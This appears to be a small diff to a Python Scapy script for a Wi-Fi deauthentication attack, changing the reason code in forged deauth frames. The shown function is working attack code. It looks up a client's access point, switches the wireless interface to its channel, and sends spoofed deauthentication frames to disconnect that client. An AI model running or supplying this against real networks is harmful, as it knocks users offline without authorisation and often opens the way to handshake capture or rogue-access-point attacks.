@@ -220,7 +220,7 @@ def deauth(target_mac, iface, count):
     global client_AP
     bssid = client_AP[target_mac]['BSSID']
     dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid)
-    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
+    frame = RadioTap() / dot11 / Dot11Deauth(reason=1)
     os.system("iwconfig " + iface + " channel " + str(client_AP[target_mac]['channel']))
     print("[+] started deauth attack...")
     sendp(frame, iface=iface, count=count, inter=.1, verbose=1)
